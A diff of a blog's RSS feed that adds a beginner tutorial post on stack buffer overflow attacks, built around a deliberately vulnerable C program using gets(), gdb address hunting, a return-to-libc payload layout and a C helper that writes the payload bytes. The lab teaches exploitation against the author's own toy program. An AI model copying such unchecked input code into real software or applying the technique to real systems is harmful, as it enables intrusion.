@@ -5,9 +5,239 @@
     <description>Pufan Jiang&#39;s personal blog, including lots of tech blogs, photo shooting etc.</description>
     <link>http://huangxuan.me/</link>
     <atom:link href="http://huangxuan.me/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Thu, 11 Feb 2016 20:44:21 -0500</pubDate>
-    <lastBuildDate>Thu, 11 Feb 2016 20:44:21 -0500</lastBuildDate>
+    <pubDate>Sun, 14 Feb 2016 14:47:45 -0500</pubDate>
+    <lastBuildDate>Sun, 14 Feb 2016 14:47:45 -0500</lastBuildDate>
     <generator>Jekyll v2.4.0</generator>
+    
+      <item>
+        <title>Secure Threats -- Buffer Overflow Attack -- Level 0</title>
+        <description>&lt;p&gt;This is a short series about secure system. The goal is to show readers that our software system is far from robust and safe, and hopefully you would keep this in mind. (We are all that easy to overlook security problems.)&lt;/p&gt;
+
+&lt;p&gt;This first several posts talk about a basic yet highly prevalent attack/hack solution to a software system that seems robust at first glance. This is called Buffer Overflow.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Pre-requisite&lt;/strong&gt; &lt;br /&gt;
+The first pre-requisite is quite easy to catch up, but the second and third ones are fundamental pre knowledge.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Familiar with C language. (This series would use C program as example.) And know how to use a &lt;code&gt;gdb&lt;/code&gt; to debug C program.&lt;/li&gt;
+  &lt;li&gt;Familiar with basic assembly language and be able to read assembly language. (No need to good at writing them!)&lt;/li&gt;
+  &lt;li&gt;Know what’s a heap, stack, shared library and basically how program is mapped into memory. Or if you could understand what this figure is talking about.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i1371.photobucket.com/albums/ag320/otnt/ProgramMemoryOrganization_zpshdbibtlq.png&quot; alt=&quot;Program Memory Organization&quot; /&gt; &lt;br /&gt;
+&lt;em&gt;(&lt;a href=&quot;http://www.amazon.com/Computer-Systems-Programmers-Perspective-2nd/dp/0136108040/ref=sr_1_3?ie=UTF8&amp;amp;qid=1454639716&amp;amp;sr=8-3&amp;amp;keywords=csapp&quot;&gt;Computer System : A Programmer’s Perspective 2nd&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;buffer-overflow-attack&quot;&gt;Buffer Overflow Attack&lt;/h2&gt;
+
+&lt;p&gt;Great, now you are ready to hack a system, and I’m showing you a way.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-is-buffer-overflow&quot;&gt;What is Buffer Overflow&lt;/h3&gt;
+&lt;p&gt;Buffer Overflow is an attack/hacking solution that takes advantage of such a vulnerability: when a victim host is trying to receive a message from an attacker, it doesn’t check the length of in-coming message, so the message could be arbitrary long and, as a result, overwrite some part of victim host’s  stack memory and make the hack.&lt;/p&gt;
+
+&lt;h3 id=&quot;an-example-your-first-hacking-attack&quot;&gt;An Example (Your first hacking attack!)&lt;/h3&gt;
+
+&lt;p&gt;To make this clearer, let’s see a typical example.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* basic.c */
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+/* server code, I&#39;m victim */
+int main(int argc, char** argv)
+{
+    char buf[16] ;
+
+    printf(&quot;Hi, I&#39;m server.\n&quot;);
+    gets(buf);
+    printf(&quot;you entered: %s\n&quot;, buf);
+
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This piece of code seems okay at first glance, but the reason it suffers from a buffer overflow attack is the use of this &lt;code&gt;gets&lt;/code&gt; function. Basically &lt;code&gt;gets&lt;/code&gt; copy string from standard input to &lt;code&gt;buf&lt;/code&gt;. To understand why this is a problem, we need to look inside the program to know what is happening underneath. Yeah, I mean to read some assembly code.&lt;/p&gt;
+
+&lt;p&gt;By running following script,&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -o basic basic.c -m32
+objdump -d basic
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we could get assembly code of &lt;code&gt;basic&lt;/code&gt;. &lt;br /&gt;
+(&lt;strong&gt;Note we add a &lt;code&gt;-m32&lt;/code&gt; here to compile it to a 32-bit version&lt;/strong&gt;)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;08048480 &amp;lt;main&amp;gt;:
+ ......
+ 8048495:  8d 44 24 10        lea    0x10(%esp),%eax # some padding
+ 8048499:  89 04 24           mov    %eax,(%esp)  # put this address as argument for gets function
+ 804849c:  e8 9f fe ff ff     call   8048340 &amp;lt;gets@plt&amp;gt;
+ ......
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I’m not going to talk about what exactly these assembly do. They are pretty straightforward if you have some experience with assembly language and also notice I add some comments to help you catch the idea.&lt;/p&gt;
+
+&lt;h4 id=&quot;now-is-key-point&quot;&gt;&lt;strong&gt;Now is key point.&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;Then what &lt;code&gt;gets&lt;/code&gt; function does is it go through standard input and copy byte by byte to &lt;code&gt;buf&lt;/code&gt; until it met a &lt;code&gt;null&lt;/code&gt; terminator. However, the &lt;code&gt;gets&lt;/code&gt; function doesn’t check input length! So what if we input a very long sentence?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;-bash-4.2$ echo &quot;a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence&quot; | ./basic
+Hi, I&#39;m server.
+you entered: a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence
+Segmentation fault (core dumped)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The problem is the input is too long so that it override some part of original stack. This could be a disaster since stack is used to keep important variable value.&lt;/p&gt;
+
+&lt;p&gt;And this is why this kind of attack is called Buffer Overflow Attack.&lt;/p&gt;
+
+&lt;h2 id=&quot;to-do-a-real-attack&quot;&gt;To do a real attack&lt;/h2&gt;
+
+&lt;p&gt;To do a real attack, i.e. let the program do something you intend it to do, rather than just crash, we need more work and more analysis.&lt;/p&gt;
+
+&lt;h4 id=&quot;analysis&quot;&gt;&lt;strong&gt;Analysis&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;By using &lt;code&gt;gdb&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) b *0x804849c
+Breakpoint 1 at 0x804849c
+(gdb) r
+Starting program: basic 
+Hi, I&#39;m server.
+
+Breakpoint 1, 0x0804849c in main ()
+(gdb) i r esp
+esp            0xffffd210       0xffffd210
+(gdb) x/wx 0xffffd210
+0xffffd210:     0xffffd220
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;we could find right before &lt;code&gt;gets&lt;/code&gt;  is called, &lt;code&gt;esp&lt;/code&gt; is pointing to &lt;code&gt;0xffffd220&lt;/code&gt;, which means our input message will be written to this address. &lt;br /&gt;
+Also, if we set breakpoint at beginning of &lt;code&gt;main&lt;/code&gt; function,&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) b *0x0x8048480
+Breakpoint 2 at 0x8048480
+(gdb) r
+Starting program: basic
+Breakpoint 2, 0x08048480 in main ()
+(gdb) i r esp
+esp            0xffffd23c       0xffffd23c
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;we could find return address for &lt;code&gt;main&lt;/code&gt; function is saved at  &lt;code&gt;0xffffd23c&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Did you find the secret? The offset between the return address and the address we are going to write is only &lt;code&gt;0xffffd23c - 0xffffd220 = 0x1C = 28&lt;/code&gt;. This means if our input message is 28 characters or more, then we could overwrite the return address of &lt;code&gt;main&lt;/code&gt; function!&lt;/p&gt;
+
+&lt;p&gt;And let’s remind what return instruction does. It puts the value pointed by &lt;code&gt;esp&lt;/code&gt; to &lt;code&gt;eip&lt;/code&gt;,  increment &lt;code&gt;esp&lt;/code&gt; by 4 bytes, and execute the code pointed by &lt;code&gt;eip&lt;/code&gt;. So this means if we change the value of return address, we could let program go to some surprised place and execute some surprised code!&lt;/p&gt;
+
+&lt;p&gt;Moreover, if we construct our input message using executable code and let the return address go to our code, then we could let program do whatever we want! And this closes our analysis! Bravo!&lt;/p&gt;
+
+&lt;h4 id=&quot;sum-up&quot;&gt;&lt;strong&gt;Sum up&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;Let’s put the pieces together. To do a basic buffer overflow attack, we need to…&lt;br /&gt;
+1.Find the address where your input message is going to write.&lt;br /&gt;
+2.Find the most recent return address that is larger than the address in point 1.&lt;br /&gt;
+3.Carefully calculate the offset of these two addresses and design your input message so that they could be executed by CPU to do some surprisingly fun job.&lt;/p&gt;
+
+&lt;h4 id=&quot;lets-hack-our-not-so-robust-program&quot;&gt;&lt;strong&gt;Let’s Hack Our ‘Not-so-Robust’ Program&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;The normal execution of &lt;code&gt;basic&lt;/code&gt; program is prompt exactly same thing as we input. Now we would like it to print &lt;code&gt;I&#39;m hacked!&lt;/code&gt; in a funny way.&lt;/p&gt;
+
+&lt;p&gt;To print something, we still need the built-in &lt;code&gt;print&lt;/code&gt; function in &lt;code&gt;stdlib&lt;/code&gt;. Take a look at assembly code again,&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) p &amp;amp;printf
+$2 = (&amp;lt;data variable, no debug info&amp;gt; *) 0xf7e32f60 &amp;lt;printf&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To print something, we need to make sure &lt;code&gt;esp&lt;/code&gt; is pointing to what we want to print (i.e. &lt;code&gt;I&#39;m hacked!&lt;/code&gt; in this case), and then call &lt;code&gt;printf&lt;/code&gt; function! The input message should be like this:&lt;br /&gt;
+[several padding to return address] – [address to &lt;code&gt;printf&lt;/code&gt;] – [pointer to hacking message]&lt;/p&gt;
+
+&lt;p&gt;To call the &lt;code&gt;printf&lt;/code&gt; function is easy, we just need to overwrite the return address in &lt;code&gt;main&lt;/code&gt; function with &lt;code&gt;printf&lt;/code&gt; address, which we’ve already figured out as  &lt;code&gt;0xf7e32f60&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Then where is the hacking message? Remember the &lt;code&gt;printf&lt;/code&gt; function print message out until it find a &lt;code&gt;null&lt;/code&gt; terminator. Therefore we could not put the hacking message at front of input message and followed by the padding, since in this way we would print rubbish that we don’t want to. So we have to put them at the end of input message. Thus, the input message should be like this:&lt;br /&gt;
+[several padding to return address] – [address to &lt;code&gt;printf&lt;/code&gt;] – [pointer to hacking message] – [hacking message]&lt;/p&gt;
+
+&lt;p&gt;One last thing, we need some padding at after return to &lt;code&gt;printf&lt;/code&gt;, this is because we use &lt;code&gt;printf&lt;/code&gt; function not by “call” but by “return”. As we analyzed before, just before call &lt;code&gt;printf&lt;/code&gt;, we make sure &lt;code&gt;esp&lt;/code&gt; pointing to message we want to print out. But when we use “return” to call a function, it first put &lt;code&gt;esp&lt;/code&gt; to &lt;code&gt;eip&lt;/code&gt; and then pop &lt;code&gt;esp&lt;/code&gt; so that &lt;code&gt;esp&lt;/code&gt; will move up by 4 bytes. Also, the value in this padding is the return address after return from &lt;code&gt;printf&lt;/code&gt;, i.e. the program will try to execute code at the position of this padding value. So we could put an &lt;code&gt;exit&lt;/code&gt; here to let the program stop.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) p &amp;amp;exit
+$5 = (&amp;lt;text variable, no debug info&amp;gt; *) 0xf7e17b10 &amp;lt;exit&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Okay! Let’s hack it!&lt;br /&gt;
+We know…&lt;br /&gt;
+1. The address we are going to write from is: &lt;code&gt;0xffffd220&lt;/code&gt;&lt;br /&gt;
+2. The original return address is at: &lt;code&gt;0xffffd23c&lt;/code&gt;&lt;br /&gt;
+3. The return address need to overwrite as &lt;code&gt;0xf7e32f60&lt;/code&gt;&lt;br /&gt;
+4. The exit address is &lt;code&gt;0xf7e17b10&lt;/code&gt;&lt;br /&gt;
+5. And we put hacking message at the end: &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;So, what we need is:&lt;br /&gt;
+&lt;code&gt;0xffffd220&lt;/code&gt; : 28 &lt;code&gt;\x90&lt;/code&gt; as padding&lt;br /&gt;
+……&lt;br /&gt;
+&lt;code&gt;0xffffd23c&lt;/code&gt; : &lt;code&gt;0xf7e32f60&lt;/code&gt; address to call &lt;code&gt;printf&lt;/code&gt;&lt;br /&gt;
+&lt;code&gt;0xffffd240&lt;/code&gt; : &lt;code&gt;0xf7e17b10&lt;/code&gt; address to exit, also as padding&lt;br /&gt;
+&lt;code&gt;0xffffd244&lt;/code&gt; : &lt;code&gt;0xffffd248&lt;/code&gt; pointer to printing message&lt;br /&gt;
+&lt;code&gt;0xffffd248&lt;/code&gt; : &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Another important thing we need to keep in mind is, our system is generally small-endian. This means instead of &lt;code&gt;0xf7e32f60&lt;/code&gt; as is human readable, we need to put &lt;code&gt;0x602fe3f7&lt;/code&gt; in our input message. The same thing holds to &lt;code&gt;0xffffd248&lt;/code&gt; and &lt;code&gt;0xf7e17b10&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;So, based on all these analysis. We get our input message:&lt;br /&gt;
+28 &lt;code&gt;\x90&lt;/code&gt;  &lt;code&gt;0x602fe3f7&lt;/code&gt; &lt;code&gt;0x107be1f7&lt;/code&gt; &lt;code&gt;0x48d2ffff&lt;/code&gt; &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;To generate the text we could have a helper program &lt;code&gt;hack&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* basic hack.c */
+#include &amp;lt;stdio.h&amp;gt;
+
+int main(int argc, char** argv)
+{
+        int i = 0;
+        //padding
+        for(i = 0; i &amp;lt; 28; i++)
+        {
+                printf(&quot;\x90&quot;);
+        }
+        printf(&quot;\x60\x2f\xe3\xf7&quot;);//address to printf
+        printf(&quot;\xa1\x83\x04\x08&quot;);//address to exit
+        printf(&quot;\x48\xd2\xff\xff&quot;);//address to print message
+        printf(&quot;I&#39;m Hacked!\n&quot;);
+
+        return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then compile it and save to a file &lt;code&gt;hack.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;-bash-4.2$ gcc -o hack hack.c                                                                                      
+-bash-4.2$ ./hack &amp;gt; hack.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finally use &lt;code&gt;gdb&lt;/code&gt; to test it!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) r &amp;lt; hack.txt 
+Starting program: basic &amp;lt; hack.txt
+Hi, I&#39;m server.
+you entered: ????????????????????????????`/{H?I&#39;m Hacked!
+I&#39;m Hacked![Inferior 1 (process 41057) exited with code 0111]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; At the end of output, it says program exited with code 0111. This means program doesn’t exit normally. This is because the &lt;code&gt;exit&lt;/code&gt; function also use &lt;code&gt;esp&lt;/code&gt; as exit code, but in our program &lt;code&gt;esp&lt;/code&gt; saves address to message. To overcome this problem, we need to use ROP(Return-Oriented-Programming) technique. See following posts!&lt;/p&gt;
+
+&lt;p&gt;Last but not least. If you test this attack without &lt;code&gt;gdb&lt;/code&gt;, you’ll get&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;-bash-4.2$ ./basic &amp;lt; hack.txt 
+Hi, I&#39;m server.
+you entered: ????????????????????????????`/{H?I&#39;m Hacked!
+Segmentation fault (core dumped)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This is because the so-called ASLR(Address Space Layout Randomization) defense technique. We’ll talk about how to overcome this defense in following posts.&lt;/p&gt;
+
+&lt;p&gt;And this ends the very basic Buffer Overflow Attack. Hope you enjoy it!&lt;/p&gt;
+</description>
+        <pubDate>Sun, 14 Feb 2016 14:38:00 -0500</pubDate>
+        <link>http://huangxuan.me/2016/02/14/Secure-Threats-Buffer-Overflow-Attack-Level-0/</link>
+        <guid isPermaLink="true">http://huangxuan.me/2016/02/14/Secure-Threats-Buffer-Overflow-Attack-Level-0/</guid>
+        
+        <category>Buffer Overflow</category>
+        
+        <category>Secure</category>
+        
+        
+      </item>
     
       <item>
         <title>Poison Pill Pattern</title>
